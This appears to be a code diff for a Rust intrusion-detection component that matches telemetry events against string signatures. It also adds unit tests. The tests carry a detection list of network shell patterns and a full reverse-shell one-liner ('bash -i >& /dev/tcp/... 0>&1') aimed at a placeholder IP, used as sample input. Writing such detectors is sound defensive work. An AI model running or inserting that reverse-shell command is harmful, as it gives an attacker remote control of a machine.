@@ -456,6 +456,7 @@ impl IocLayer1 {
         if let Some(cmd) = &event.command_line {
             let matches = self.check_text(cmd);
             if !matches.is_empty() {
+                hit.result = Layer1Result::ExactMatch;
                 hit.matched_fields.push("command_line".to_string());
                 hit.matched_signatures.extend(matches);
             }
@@ -463,6 +464,7 @@ impl IocLayer1 {
         if let Some(path) = &event.file_path {
             let matches = self.check_text(path);
             if !matches.is_empty() {
+                hit.result = Layer1Result::ExactMatch;
                 hit.matched_fields.push("file_path".to_string());
                 hit.matched_signatures.extend(matches);
             }
@@ -533,5 +535,54 @@ impl IocLayer1 {
 impl Default for IocLayer1 {
     fn default() -> Self {
         Self::new()
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn check_text_detects_reverse_shell() {
+        let mut l1 = IocLayer1::new();
+        l1.load_string_signatures([
+            ">& /dev/tcp/".to_string(),
+            "bash -i".to_string(),
+        ]);
+        let hits = l1.check_text("bash -i >& /dev/tcp/198.51.100.77/4444 0>&1");
+        eprintln!("hits = {:?}", hits);
+        assert!(!hits.is_empty(), "expected to find 'bash -i' in command line");
+        assert!(hits.iter().any(|h| h.contains("bash -i")));
+    }
+
+    #[test]
+    fn check_event_detects_reverse_shell() {
+        let mut l1 = IocLayer1::new();
+        l1.load_string_signatures([
+            ">& /dev/tcp/".to_string(),
+            "bash -i".to_string(),
+            "nc -e /bin".to_string(),
+        ]);
+        let event = crate::types::TelemetryEvent {
+            ts_unix: 1000,
+            event_class: crate::types::EventClass::ProcessExec,
+            pid: 1002,
+            ppid: 0,
+            uid: 0,
+            process: "bash".to_string(),
+            parent_process: "unknown".to_string(),
+            session_id: 0,
+            file_path: Some("/bin/bash".to_string()),
+            file_write: false,
+            file_hash: None,
+            dst_port: None,
+            dst_ip: None,
+            dst_domain: None,
+            command_line: Some("bash -i >& /dev/tcp/198.51.100.77/4444 0>&1".to_string()),
+            event_size: None,
+        };
+        let hit = l1.check_event(&event);
+        eprintln!("hit = {:?}", hit);
+        assert_eq!(hit.result, Layer1Result::ExactMatch);
     }
 }
